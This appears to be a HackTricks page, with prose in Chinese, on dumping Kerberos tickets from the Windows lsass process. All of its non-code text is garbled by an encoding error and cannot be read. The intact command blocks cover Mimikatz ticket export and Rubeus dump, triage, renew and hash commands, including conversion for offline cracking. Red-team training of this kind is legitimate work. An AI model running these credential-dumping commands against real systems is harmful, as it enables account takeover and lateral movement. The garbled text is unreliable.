# ä»Windowsä¸­æå–ç¥¨è¯

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**Telegramç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

Windowsä¸­çš„ç¥¨è¯ç”±**lsass**ï¼ˆæœ¬åœ°å®‰å…¨æˆæƒå­ç³»ç»ŸæœåŠ¡ï¼‰è¿›ç¨‹ç®¡ç†å’Œå­˜å‚¨ï¼Œè¯¥è¿›ç¨‹è´Ÿè´£å¤„ç†å®‰å…¨ç­–ç•¥ã€‚è¦æå–è¿™äº›ç¥¨è¯ï¼Œå¿…é¡»ä¸lsassè¿›ç¨‹è¿›è¡Œäº¤äº’ã€‚éç®¡ç†å‘˜ç”¨æˆ·åªèƒ½è®¿é—®è‡ªå·±çš„ç¥¨è¯ï¼Œè€Œç®¡ç†å‘˜åˆ™æœ‰æƒæå–ç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç¥¨è¯ã€‚å¯¹äºæ­¤ç±»æ“ä½œï¼Œå·¥å…·**Mimikatz**å’Œ**Rubeus**è¢«å¹¿æ³›ä½¿ç”¨ï¼Œæ¯ç§å·¥å…·æä¾›ä¸åŒçš„å‘½ä»¤å’ŒåŠŸèƒ½ã€‚

### Mimikatz
Mimikatzæ˜¯ä¸€ä¸ªå¤šåŠŸèƒ½å·¥å…·ï¼Œå¯ä»¥ä¸Windowså®‰å…¨è¿›è¡Œäº¤äº’ã€‚å®ƒä¸ä»…ç”¨äºæå–ç¥¨è¯ï¼Œè¿˜ç”¨äºå„ç§å…¶ä»–ä¸å®‰å…¨ç›¸å…³çš„æ“ä½œã€‚
```bash
# Extracting tickets using Mimikatz
sekurlsa::tickets /export
```
### Rubeus
Rubeus æ˜¯ä¸€ä¸ªä¸“é—¨ä¸º Kerberos äº¤äº’å’Œæ“ä½œé‡èº«å®šåˆ¶çš„å·¥å…·ã€‚å®ƒç”¨äºç¥¨è¯æå–å’Œå¤„ç†ï¼Œä»¥åŠå…¶ä»–ä¸ Kerberos ç›¸å…³çš„æ´»åŠ¨ã€‚
```bash
# Dumping all tickets using Rubeus
.\Rubeus dump
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))

# Listing all tickets
.\Rubeus.exe triage

# Dumping a specific ticket by LUID
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))

# Renewing a ticket
.\Rubeus.exe renew /ticket:<BASE64_TICKET>

# Converting a ticket to hashcat format for offline cracking
.\Rubeus.exe hash /ticket:<BASE64_TICKET>
```
åœ¨ä½¿ç”¨è¿™äº›å‘½ä»¤æ—¶ï¼Œè¯·ç¡®ä¿å°†å ä½ç¬¦å¦‚ `<BASE64_TICKET>` å’Œ `<luid>` æ›¿æ¢ä¸ºå®é™…çš„ Base64 ç¼–ç ç¥¨è¯å’Œç™»å½• IDã€‚è¿™äº›å·¥å…·æä¾›äº†å¹¿æ³›çš„åŠŸèƒ½ï¼Œç”¨äºç®¡ç†ç¥¨è¯å’Œä¸ Windows çš„å®‰å…¨æœºåˆ¶è¿›è¡Œäº¤äº’ã€‚

## å‚è€ƒæ–‡çŒ®
* [https://www.tarlogic.com/en/blog/how-to-attack-kerberos/](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
